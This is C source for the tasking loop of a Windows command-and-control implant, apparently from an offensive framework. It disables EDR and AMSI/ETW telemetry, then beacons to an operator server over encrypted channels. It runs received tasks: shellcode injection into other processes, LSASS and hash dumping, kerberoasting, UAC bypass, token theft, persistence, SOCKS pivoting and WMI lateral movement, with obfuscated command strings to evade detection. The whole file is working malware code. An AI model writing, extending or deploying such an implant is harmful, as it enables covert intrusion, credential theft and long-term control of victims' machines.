#include "beacon.h"
#include "bof.h"
#include "channels.h"
#include "commands.h"
#include "crypto.h"
#include "evasion.h"
#include "inject.h"
#include "persist.h"
#include "socks.h"
#include "adv_lazy.h"
#include "evs_strings.h"
#ifndef HTTP_ONLY
#include <curl/curl.h>
#endif
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

static int _cmdeq(const char *cmd, const unsigned char *enc, size_t n) {
    volatile unsigned char k = EVS_KEY;
    for (size_t i = 0; i < n; i++)
        if ((unsigned char)cmd[i] != (unsigned char)(enc[i] ^ k)) return 0;
    return cmd[n] == '\0';
}

static void agent_run(void)
{
    /* Read gs_flag at the very first instruction — before any slow init (evasion,
     * curl, crypto). The parent polls this file after the UAC bypass fires; the
     * narrower the window between agent start and flag deletion, the more reliable
     * the detection. Store the result and act on it after full init below. */
    int _gs_triggered = agent_read_gs_flag();

    evasion_stomp_header();

#ifndef SKIP_EVASION
    evasion_unhook_ntdll();
    evasion_patch_etw();
    evasion_patch_amsi();
    evasion_patch_etw_ti();
#endif

#ifndef HTTP_ONLY
    curl_global_init(CURL_GLOBAL_DEFAULT);
#endif

    agent_ctx_t agent;
    channel_config_t cfg;

    int init_rc = agent_init(&agent);
    if (init_rc != 0)
        goto done;
    channel_config_init(&cfg);

    /* auto-getsystem: flag was consumed above, now escalate with a live context */
    if (_gs_triggered) {
        char _gs[4096] = {0};
        cmd_getsystem(NULL, _gs, sizeof(_gs));
        agent_get_username(agent.username, sizeof(agent.username));
        agent_get_privileges(agent.privileges, sizeof(agent.privileges));
        beacon_append_output(&agent, _gs, strlen(_gs));
    }

    /* phase 1: handshake */
    while (!agent.handshake_done)
    {
        /* send our public key */
        char *hs_pkt = beacon_build_handshake(&agent);
        if (hs_pkt)
        {
            channel_send(&cfg, agent.agent_id, hs_pkt);
            free(hs_pkt);
        }

        /* poll for server public key */
        char *resp = channel_recv(&cfg, agent.agent_id);
        if (resp)
        {
            char cmd[32] = {0}, args[4096] = {0}, task_id[64] = {0};
            char *data = NULL;
            beacon_parse_response(&agent, resp,
                                  cmd, sizeof(cmd),
                                  args, sizeof(args),
                                  task_id, sizeof(task_id),
                                  &data);
            free(data);
            free(resp);
        }

        if (!agent.handshake_done)
            beacon_sleep(); /* jittered interval between handshake retries */
    }

    /* phase 2: main beacon loop */
    for (;;)
    {
        /* build and send encrypted beacon */
        char *pkt = beacon_build(&agent);
        if (pkt)
        {
            if (channel_send(&cfg, agent.agent_id, pkt) == CHANNEL_OK)
            {
                /* beacon sent, clear output buffer */
                beacon_clear_output(&agent);
            }
            free(pkt);
        }

        /* receive pending task */
        char *raw = channel_recv(&cfg, agent.agent_id);
        if (raw)
        {
            char cmd[32] = {0};
            char args[4096] = {0};
            char task_id[64] = {0};
            char *data = NULL;

            int parse_ok = beacon_parse_response(&agent, raw,
                                                 cmd, sizeof(cmd),
                                                 args, sizeof(args),
                                                 task_id, sizeof(task_id),
                                                 &data);
            free(raw);

            if (parse_ok == 0 && cmd[0] != '\0')
            {
                /* store task_id for ACK in next beacon */
                snprintf(agent.last_task_id, sizeof(agent.last_task_id), "%s", task_id);

                char *output = (char *)calloc(1, OUTPUT_BUF_SIZE);
                if (!output) { free(data); continue; }
                int ret = -1;

                if (strcmp(cmd, "help") == 0 || strcmp(cmd, "h") == 0)
                {
                    snprintf(output, OUTPUT_BUF_SIZE, "ok\n");
                    ret = 0;
                }
                else if (strcmp(cmd, "ls") == 0)
                {
                    ret = cmd_ls(args[0] ? args : ".", output, OUTPUT_BUF_SIZE);
                }
                else if (strcmp(cmd, "mkdir") == 0)
                {
                    ret = cmd_mkdir(args, output, OUTPUT_BUF_SIZE);
                }
                else if (strcmp(cmd, "rm") == 0)
                {
                    ret = cmd_rm(args, output, OUTPUT_BUF_SIZE);
                }
                else if (strcmp(cmd, "cp") == 0)
                {
                    char src[1024] = {0}, dst[1024] = {0};
                    sscanf(args, "%1023s %1023s", src, dst);
                    ret = cmd_cp(src, dst, output, OUTPUT_BUF_SIZE);
                }
                else if (strcmp(cmd, "mv") == 0)
                {
                    char src[1024] = {0}, dst[1024] = {0};
                    sscanf(args, "%1023s %1023s", src, dst);
                    ret = cmd_mv(src, dst, output, OUTPUT_BUF_SIZE);
                }
                else if (strcmp(cmd, "reg") == 0)
                {
                    /* reg: query|set|delete <keypath> [...] */
                    char action[16]  = {0};
                    char keypath[512] = {0};
                    char valname[256] = {0};
                    char type_s[32]   = {0};
                    char value[1024]  = {0};

                    /* parse action */
                    const char *p = args;
                    sscanf(p, "%15s", action);
                    p = strchr(p, ' ');
                    if (p) p++;

                    if (p) {
                        /* parse key path, handles paths with spaces */
                        const char *q = p;
                        const char *key_end = NULL;
                        int first_tok = 1;
                        while (*q) {
                            const char *tok = q;
                            while (*q && *q != ' ') q++;
                            int in_key = (first_tok && strncmp(tok, "HKEY_", 5) == 0);
                            if (!in_key) {
                                for (const char *c = tok; c < q; c++)
                                    if (*c == '\\') { in_key = 1; break; }
                            }
                            if (in_key) { key_end = q; }
                            else        { break; }
                            first_tok = 0;
                            if (*q == ' ') q++;
                        }
                        if (key_end) {
                            size_t klen = (size_t)(key_end - p);
                            if (klen >= sizeof(keypath)) klen = sizeof(keypath) - 1;
                            strncpy(keypath, p, klen);
                            keypath[klen] = '\0';
                            p = key_end;
                            if (*p == ' ') p++;
                            if (!*p) p = NULL;
                        } else {
                            sscanf(p, "%511s", keypath);
                            p = strchr(p, ' ');
                            if (p) p++;
                        }
                    }

                    if (strcmp(action, "query") == 0) {
                        if (p) sscanf(p, "%255s", valname);
                        ret = cmd_reg_query(keypath, valname,
                                            output, OUTPUT_BUF_SIZE);
                    } else if (strcmp(action, "set") == 0) {
                        /* valname type value (value may contain spaces) */
                        if (p) {
                            sscanf(p, "%255s", valname);
                            p = strchr(p, ' ');
                            if (p) p++;
                        }
                        if (p) {
                            sscanf(p, "%31s", type_s);
                            p = strchr(p, ' ');
                            if (p) p++;
                        }
                        if (p) {
                            strncpy(value, p, sizeof(value) - 1);
                            value[sizeof(value) - 1] = '\0';
                        }
                        ret = cmd_reg_set(keypath, valname, type_s, value,
                                          output, OUTPUT_BUF_SIZE);
                    } else if (strcmp(action, "delete") == 0) {
                        if (p) sscanf(p, "%255s", valname);
                        ret = cmd_reg_delete(keypath, valname,
                                             output, OUTPUT_BUF_SIZE);
                    } else {
                        snprintf(output, OUTPUT_BUF_SIZE,
                                 "[reg] usage: query|set|delete <key> ...\n");
                        ret = -1;
                    }
                }
#ifndef LEAN
                else if (_cmdeq(cmd, EVS_str_cmd_shinject, sizeof(EVS_str_cmd_shinject)))
                {
                    if (!data || !data[0]) {
                        snprintf(output, OUTPUT_BUF_SIZE, "e:0\n");
                    } else {
                        size_t   sc_len = 0;
                        uint8_t *sc     = base64_decode(data, &sc_len);
                        if (!sc) {
                            snprintf(output, OUTPUT_BUF_SIZE, "e:b64\n");
                        } else {
                            ret = inject_self(sc, sc_len);
                            SecureZeroMemory(sc, sc_len);
                            free(sc);
                            if (ret == 0)
                                snprintf(output, OUTPUT_BUF_SIZE, "ok:%zu\n", sc_len);
                            else
                                snprintf(output, OUTPUT_BUF_SIZE, "rc:%d\n", ret);
                        }
                    }
                }
#endif /* LEAN */
                else if (strcmp(cmd, "shell") == 0)
                {
                    ret = cmd_shell(args, output, OUTPUT_BUF_SIZE);
                }
                else if (strcmp(cmd, "sysinfo") == 0)
                {
                    ret = cmd_sysinfo(output, OUTPUT_BUF_SIZE);
                }
                else if (strcmp(cmd, "ps") == 0)
                {
                    ret = cmd_ps(output, OUTPUT_BUF_SIZE);
                }
                else if (strcmp(cmd, "getpid") == 0)
                {
                    ret = cmd_getpid(args, output, OUTPUT_BUF_SIZE);
                }
                else if (strcmp(cmd, "download") == 0)
                {
                    ret = cmd_download(args, output, OUTPUT_BUF_SIZE);
                }
                else if (strcmp(cmd, "upload") == 0)
                {
                    /* args = destination path, data = base64 file content */
                    ret = cmd_upload(args, data, output, OUTPUT_BUF_SIZE);
                }
                else if (strcmp(cmd, "sleep") == 0)
                {
                    DWORD ms = (DWORD)strtoul(args, NULL, 10);
                    beacon_sleep_obf(ms);
                    snprintf(output, OUTPUT_BUF_SIZE, "ok:%lu\n", ms);
                    ret = 0;
                }
#ifndef LEAN
                else if (_cmdeq(cmd, EVS_str_cmd_inject, sizeof(EVS_str_cmd_inject)))
                {
                    /* inject: args = "[pid] [method]", data = base64 shellcode */
                    char pid_s[16]    = {0};
                    char method_s[16] = {0};
                    char extra[512]   = {0};  /* optional dll_path for stomp */
                    sscanf(args, "%15s %15s %511s", pid_s, method_s, extra);

                    DWORD pid = (DWORD)strtoul(pid_s, NULL, 10);
                    if (pid == 0) pid = inject_find_target();

                    if (pid == 0) {
                        snprintf(output, OUTPUT_BUF_SIZE, "e:pid\n");
                    } else {
                        size_t   sc_len = 0;
                        uint8_t *sc     = base64_decode(data, &sc_len);
                        if (!sc) {
                            snprintf(output, OUTPUT_BUF_SIZE, "e:b64\n");
                        } else {
                            /* method names as char arrays — no plaintext in .rdata */
                            char _mh[] = {'h','i','j','a','c','k',0};
                            char _me[] = {'e','a','r','l','y','b','i','r','d',0};
                            char _ms[] = {'s','t','o','m','p',0};
                            int use_hijack    = (strcmp(method_s, _mh) == 0);
                            int use_earlybird = (strcmp(method_s, _me) == 0);
                            int use_stomp     = (strcmp(method_s, _ms) == 0);

                            if (use_earlybird) {
                                ret = inject_earlybird(sc, sc_len);
                                SecureZeroMemory(sc, sc_len);
                                free(sc);
                                snprintf(output, OUTPUT_BUF_SIZE,
                                         ret == 0 ? "ok\n" : "rc:%d\n", ret);
                            } else if (use_stomp) {
                                ret = inject_stomp(pid, sc, sc_len,
                                                   extra[0] ? extra : NULL);
                                SecureZeroMemory(sc, sc_len);
                                free(sc);
                                if (ret == 0)
                                    snprintf(output, OUTPUT_BUF_SIZE, "ok:%lu\n",
                                             (unsigned long)pid);
                                else
                                    snprintf(output, OUTPUT_BUF_SIZE, "rc:%d:%lu\n",
                                             ret, (unsigned long)pid);
                            } else {
                                ret = use_hijack
                                    ? inject_thread_hijack(pid, sc, sc_len)
                                    : inject_remote(pid, sc, sc_len);
                                SecureZeroMemory(sc, sc_len);
                                free(sc);
                                if (ret == 0)
                                    snprintf(output, OUTPUT_BUF_SIZE, "ok:%lu\n",
                                             (unsigned long)pid);
                                else
                                    snprintf(output, OUTPUT_BUF_SIZE, "rc:%d:%lu\n",
                                             ret, (unsigned long)pid);
                            }
                        }
                    }
                }
#endif /* LEAN */
                else if (_cmdeq(cmd, EVS_str_cmd_bof, sizeof(EVS_str_cmd_bof)))
                {
                    /* bof: data = b64 COFF, args = b64 packed BOF args */
                    ret = cmd_bof(data, args[0] ? args : NULL, output, OUTPUT_BUF_SIZE);
                }
                else if (strcmp(cmd, "socks") == 0)
                {
                    char action[16] = {0};
                    char portstr[8] = {0};
                    sscanf(args, "%15s %7s", action, portstr);
                    if (strcmp(action, "start") == 0) {
                        unsigned short port = (unsigned short)strtoul(portstr, NULL, 10);
                        if (!port) port = 1080;
                        ret = socks_start(port, output, OUTPUT_BUF_SIZE);
                    } else if (strcmp(action, "stop") == 0) {
                        ret = socks_stop(output, OUTPUT_BUF_SIZE);
                    } else if (strcmp(action, "status") == 0) {
                        snprintf(output, OUTPUT_BUF_SIZE, "[socks] %s\n",
                                 socks_running() ? "running" : "stopped");
                        ret = 0;
                    } else {
                        snprintf(output, OUTPUT_BUF_SIZE,
                                 "[socks] usage: start <port> | stop | status\n");
                        ret = -1;
                    }
                }
                else if (strcmp(cmd, "rportfwd") == 0)
                {
                    /* rportfwd: start <lport> <rhost> <rport> | stop <lport> | list */
                    char action[16] = {0};
                    char p1[256]    = {0};  /* lport or rhost */
                    char p2[256]    = {0};  /* rhost */
                    char p3[8]      = {0};  /* rport */
                    sscanf(args, "%15s %255s %255s %7s", action, p1, p2, p3);

                    if (strcmp(action, "start") == 0) {
                        unsigned short lport = (unsigned short)strtoul(p1, NULL, 10);
                        unsigned short rport = (unsigned short)strtoul(p3, NULL, 10);
                        if (!lport || !rport || !p2[0]) {
                            snprintf(output, OUTPUT_BUF_SIZE,
                                "[rportfwd] usage: start <lport> <rhost> <rport>\n");
                            ret = -1;
                        } else {
                            ret = rportfwd_start(lport, p2, rport, output, OUTPUT_BUF_SIZE);
                        }
                    } else if (strcmp(action, "stop") == 0) {
                        unsigned short lport = (unsigned short)strtoul(p1, NULL, 10);
                        ret = rportfwd_stop(lport, output, OUTPUT_BUF_SIZE);
                    } else if (strcmp(action, "list") == 0) {
                        ret = rportfwd_list(output, OUTPUT_BUF_SIZE);
                    } else {
                        snprintf(output, OUTPUT_BUF_SIZE,
                            "[rportfwd] usage: start <lport> <rhost> <rport> | stop <lport> | list\n");
                        ret = -1;
                    }
                }
                else if (strcmp(cmd, "persist") == 0)
                {
                    /* persist: install registry|schtask|auto | remove registry|schtask */
                    char action[16] = {0};
                    char method_s[16] = {0};
                    sscanf(args, "%15s %15s", action, method_s);

                    if (strcmp(action, "install") == 0) {
                        if (strcmp(method_s, "registry") == 0)
                            ret = persist_install(PERSIST_REGISTRY);
                        else if (strcmp(method_s, "schtask") == 0)
                            ret = persist_install(PERSIST_SCHTASK);
                        else
                            ret = persist_auto();
                        snprintf(output, OUTPUT_BUF_SIZE,
                                 "[persist] install rc=%d\n", ret);
                    } else if (strcmp(action, "remove") == 0) {
                        persist_method_t m = (strcmp(method_s, "registry") == 0)
                            ? PERSIST_REGISTRY : PERSIST_SCHTASK;
                        ret = persist_remove(m);
                        snprintf(output, OUTPUT_BUF_SIZE,
                                 "[persist] remove rc=%d\n", ret);
                    } else {
                        snprintf(output, OUTPUT_BUF_SIZE,
                                 "[persist] usage: install registry|schtask|auto  /  remove registry|schtask\n");
                        ret = -1;
                    }
                }
#ifndef LEAN
                else if (_cmdeq(cmd, EVS_str_cmd_lsassdump, sizeof(EVS_str_cmd_lsassdump)))
                {
                    ret = cmd_lsassdump(args[0] ? args : NULL,
                                        output, OUTPUT_BUF_SIZE);
                }
                else if (_cmdeq(cmd, EVS_str_cmd_hashdump, sizeof(EVS_str_cmd_hashdump)))
                {
                    ret = cmd_hashdump(args[0] ? args : NULL,
                                       output, OUTPUT_BUF_SIZE);
                }
#endif /* LEAN */
                else if (strcmp(cmd, "portscan") == 0)
                {
                    /* portscan: <host> <start>-<end> [timeout_ms] */
                    char host_s[256]  = {0};
                    char range_s[32]  = {0};
                    char timeout_s[16] = {0};
                    sscanf(args, "%255s %31s %15s", host_s, range_s, timeout_s);

                    unsigned short pstart = 1, pend = 1024;
                    char *dash = strchr(range_s, '-');
                    if (dash) {
                        *dash  = '\0';
                        pstart = (unsigned short)strtoul(range_s, NULL, 10);
                        pend   = (unsigned short)strtoul(dash + 1, NULL, 10);
                    } else if (range_s[0]) {
                        pstart = pend = (unsigned short)strtoul(range_s, NULL, 10);
                    }
                    int toms = timeout_s[0] ? (int)strtoul(timeout_s, NULL, 10) : 500;
                    ret = cmd_portscan(host_s, pstart, pend, toms,
                                       output, OUTPUT_BUF_SIZE);
                }
#ifndef LEAN
                else if (strcmp(cmd, "screenshot") == 0)
                {
                    ret = cmd_screenshot(output, OUTPUT_BUF_SIZE);
                }
                else if (_cmdeq(cmd, EVS_str_cmd_execasm, sizeof(EVS_str_cmd_execasm)))
                {
                    /* execute-assembly: data = b64 PE, args for Main */
                    size_t   asm_len  = 0;
                    uint8_t *asm_bytes = base64_decode(data, &asm_len);
                    if (!asm_bytes) {
                        snprintf(output, OUTPUT_BUF_SIZE,
                                 "[execute-assembly] b64 decode failed\n");
                    } else {
                        ret = cmd_execasm(asm_bytes, asm_len,
                                          args[0] ? args : NULL,
                                          output, OUTPUT_BUF_SIZE);
                        SecureZeroMemory(asm_bytes, asm_len);
                        free(asm_bytes);
                    }
                }
#endif /* LEAN */
                else if (strcmp(cmd, "privs") == 0)
                {
                    /* args: list | enable <name> | disable <name> */
                    char action[16]    = {0};
                    char priv_name[64] = {0};
                    sscanf(args, "%15s %63s", action, priv_name);
                    ret = cmd_privs(action[0] ? action : "list",
                                    priv_name, output, OUTPUT_BUF_SIZE);
                }
                else if (strcmp(cmd, "spawn") == 0)
                {
                    /* spawn: <exe_path> <fake_args> [real_args] */
                    char exe_path[512]   = {0};
                    char fake_args[1024] = {0};
                    char real_args[1024] = {0};

                    /* first field: exe_path */
                    const char *p = args;
                    sscanf(p, "%511s", exe_path);
                    p = strchr(p, ' ');
                    if (p) p++;

                    /* second field: fake_args */
                    if (p) {
                        sscanf(p, "%1023s", fake_args);
                        p = strchr(p, ' ');
                        if (p) p++;
                    }

                    /* rest: real_args, may contain spaces */
                    if (p && p[0]) {
                        strncpy(real_args, p, sizeof(real_args) - 1);
                        real_args[sizeof(real_args) - 1] = '\0';
                    }

                    ret = cmd_spawn(exe_path, fake_args,
                                    real_args[0] ? real_args : NULL,
                                    output, OUTPUT_BUF_SIZE);
                }
                else if (strcmp(cmd, "wmiexec") == 0)
                {
                    /* wmiexec: <host> <cmdline...>, split on first space */
                    char host_s[256] = {0};
                    char wcmd[2048]  = {0};
                    const char *wp = args;
                    sscanf(wp, "%255s", host_s);
                    wp = strchr(wp, ' ');
                    if (wp) { wp++; strncpy(wcmd, wp, sizeof(wcmd) - 1); }
                    ret = cmd_wmiexec(host_s, wcmd, output, OUTPUT_BUF_SIZE);
                }
                else if (_cmdeq(cmd, EVS_str_cmd_uacbypass, sizeof(EVS_str_cmd_uacbypass)))
                {
                    ret = cmd_uacbypass(args, output, OUTPUT_BUF_SIZE);
                }
                else if (_cmdeq(cmd, EVS_str_cmd_getsystem, sizeof(EVS_str_cmd_getsystem)))
                {
                    ret = cmd_getsystem(args, output, OUTPUT_BUF_SIZE);
                }
                else if (_cmdeq(cmd, EVS_str_cmd_privesc, sizeof(EVS_str_cmd_privesc)))
                {
                    ret = cmd_privesc(output, OUTPUT_BUF_SIZE);
                }
                else if (strcmp(cmd, "lpe_check") == 0)
                {
                    ret = cmd_lpe_check(args, output, OUTPUT_BUF_SIZE);
                }
#ifndef LEAN
                else if (_cmdeq(cmd, EVS_str_cmd_kerberoast, sizeof(EVS_str_cmd_kerberoast)))
                {
                    ret = cmd_kerberoast(args, output, OUTPUT_BUF_SIZE);
                }
                else if (_cmdeq(cmd, EVS_str_cmd_asreproast, sizeof(EVS_str_cmd_asreproast)))
                {
                    ret = cmd_asreproast(args, output, OUTPUT_BUF_SIZE);
                }
#endif /* LEAN */
                else if (strcmp(cmd, "getuid") == 0)
                {
                    ret = cmd_getuid(output, OUTPUT_BUF_SIZE);
                }
                else if (_cmdeq(cmd, EVS_str_cmd_steal_token, sizeof(EVS_str_cmd_steal_token)))
                {
                    unsigned long pid = strtoul(args, NULL, 10);
                    if (!pid) {
                        snprintf(output, OUTPUT_BUF_SIZE, "[st] usage: st <pid>\n");
                        ret = -1;
                    } else {
                        ret = cmd_steal_token(pid, output, OUTPUT_BUF_SIZE);
                    }
                }
                else if (strcmp(cmd, "rev2self") == 0)
                {
                    ret = cmd_rev2self(output, OUTPUT_BUF_SIZE);
                }
                else if (strcmp(cmd, "make_token") == 0)
                {
                    /* make_token: args = "DOMAIN\\user password" */
                    char domain_user[256] = {0};
                    char password[256]    = {0};
                    char *sp = strchr(args, ' ');
                    if (sp) {
                        size_t du_len = (size_t)(sp - args);
                        if (du_len >= sizeof(domain_user))
                            du_len = sizeof(domain_user) - 1;
                        memcpy(domain_user, args, du_len);
                        strncpy(password, sp + 1, sizeof(password) - 1);
                    } else {
                        size_t alen = strlen(args);
                        if (alen >= sizeof(domain_user)) alen = sizeof(domain_user) - 1;
                        memcpy(domain_user, args, alen);
                        domain_user[alen] = '\0';
                    }
                    ret = cmd_make_token(domain_user, password,
                                         output, OUTPUT_BUF_SIZE);
                    SecureZeroMemory(password, sizeof(password));
                }
                else if (strcmp(cmd, "kill") == 0)
                {
                    DWORD pid = (DWORD)strtoul(args, NULL, 10);
                    HANDLE hproc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
                    if (!hproc) {
                        snprintf(output, OUTPUT_BUF_SIZE,
                                 "[kill] OpenProcess(%lu) failed: %lu\n",
                                 (unsigned long)pid, GetLastError());
                    } else {
                        TerminateProcess(hproc, 1);
                        CloseHandle(hproc);
                        snprintf(output, OUTPUT_BUF_SIZE,
                                 "[kill] pid=%lu terminated\n",
                                 (unsigned long)pid);
                        ret = 0;
                    }
                }
                else if (strcmp(cmd, "cd") == 0)
                {
                    if (SetCurrentDirectoryA(args[0] ? args : ".")) {
                        GetCurrentDirectoryA((DWORD)OUTPUT_BUF_SIZE, output);
                        size_t n = strlen(output);
                        if (n < OUTPUT_BUF_SIZE - 1) {
                            output[n] = '\n'; output[n+1] = '\0';
                        }
                        ret = 0;
                    } else {
                        snprintf(output, OUTPUT_BUF_SIZE,
                                 "[cd] failed: %lu\n", GetLastError());
                    }
                }
                else if (strcmp(cmd, "pwd") == 0)
                {
                    if (GetCurrentDirectoryA((DWORD)OUTPUT_BUF_SIZE, output) > 0) {
                        size_t n = strlen(output);
                        if (n < OUTPUT_BUF_SIZE - 1) {
                            output[n] = '\n'; output[n+1] = '\0';
                        }
                        ret = 0;
                    } else {
                        snprintf(output, OUTPUT_BUF_SIZE,
                                 "[pwd] failed: %lu\n", GetLastError());
                    }
                }
                else
                {
                    snprintf(output, OUTPUT_BUF_SIZE,
                             "[error] unknown command: %s\n", cmd);
                }

                beacon_append_output(&agent, output, strlen(output));
                free(output);
            }
            free(data);
        }

        beacon_sleep();
    }

done:
    agent_free(&agent);
#ifndef HTTP_ONLY
    curl_global_cleanup();
#endif
}

/* ------------------------------------------------------------------ */
/* Entry points                                                         */
/* ------------------------------------------------------------------ */

#ifdef _REFLECTIVE_DLL
void agent_main(void) { agent_run(); }
#else

static SERVICE_STATUS_HANDLE g_ssh = NULL;
static SERVICE_STATUS         g_ss  = {0};

static void _svc_set(DWORD state, DWORD hint)
{
    g_ss.dwServiceType             = SERVICE_WIN32_OWN_PROCESS;
    g_ss.dwCurrentState            = state;
    g_ss.dwControlsAccepted        = (state == SERVICE_START_PENDING) ? 0 : SERVICE_ACCEPT_STOP;
    g_ss.dwWin32ExitCode           = NO_ERROR;
    g_ss.dwServiceSpecificExitCode = 0;
    g_ss.dwCheckPoint              = (state == SERVICE_RUNNING || state == SERVICE_STOPPED) ? 0 : 1;
    g_ss.dwWaitHint                = hint;
    { const adv_api_t *_a = adv_get(); if (_a->SetServiceStatus) _a->SetServiceStatus(g_ssh, &g_ss); }
}

static DWORD WINAPI _svc_agent_thread(LPVOID p) { (void)p; agent_run(); return 0; }

static VOID WINAPI _svc_ctrl(DWORD ctrl)
{
    if (ctrl == SERVICE_CONTROL_STOP) {
        _svc_set(SERVICE_STOP_PENDING, 3000);
        ExitProcess(0);
    }
}

static VOID WINAPI _svc_main(DWORD argc, LPSTR *argv)
{
    const char *sn = (argc > 0 && argv && argv[0]) ? argv[0] : "";
    { const adv_api_t *_a = adv_get();
      if (_a->RegisterServiceCtrlHandlerA)
          g_ssh = _a->RegisterServiceCtrlHandlerA(sn, _svc_ctrl);
    }
    if (!g_ssh) return;
    _svc_set(SERVICE_START_PENDING, 3000);
    HANDLE ht = CreateThread(NULL, 0, _svc_agent_thread, NULL, 0, NULL);
    _svc_set(SERVICE_RUNNING, 0);
    if (ht) { WaitForSingleObject(ht, INFINITE); CloseHandle(ht); }
    _svc_set(SERVICE_STOPPED, 0);
}

int WINAPI WinMain(HINSTANCE hI, HINSTANCE hP, LPSTR lp, int nC)
{
    (void)hI; (void)hP; (void)lp; (void)nC;
    SERVICE_TABLE_ENTRYA ste[] = { {"", _svc_main}, {NULL, NULL} };
    const adv_api_t *_adv = adv_get();
    if (!_adv->StartServiceCtrlDispatcherA || !_adv->StartServiceCtrlDispatcherA(ste)) {
        if (GetLastError() == ERROR_FAILED_SERVICE_CONTROLLER_CONNECT)
            agent_run();
    }
    return 0;
}
#endif /* _REFLECTIVE_DLL */
